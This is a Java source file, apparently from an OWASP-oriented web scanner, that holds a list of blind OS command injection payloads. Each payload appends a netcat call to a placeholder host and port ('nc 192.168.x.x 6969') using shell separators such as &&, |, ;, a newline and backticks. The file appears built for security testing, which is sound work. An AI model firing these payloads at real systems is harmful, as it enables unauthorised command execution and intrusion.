package com.funtap.awass.Top10OWASPWeb2021.PayLoadSignature.A3Injection;

public class OSCommandInjectionBlind {
    private static String[] arrPayCMDi;

    public OSCommandInjectionBlind() {
        arrPayCMDi = new String[]{
                "127.0.0.1 && nc 192.168.x.x 6969",
                "127.0.0.1 || nc 192.168.x.x 6969",
                "127.0.0.1 | nc 192.168.x.x 6969",
                "|| nc 192.168.x.x 6969 ; x || nc 192.168.x.x 6969",
                "| nc 192.168.x.x 6969 |",
                "| nc 192.168.x.x 6969 |",
                "& nc 192.168.x.x 6969 &",
                "& nc 192.168.x.x 6969 &",
                "; nc 192.168.x.x 6969 ;",
                "%0a nc 192.168.x.x 6969 %0a",
                "` nc 192.168.x.x 6969 `",};
    }

    public String[] getArrPayCMDi() {
        return arrPayCMDi;
    }
}
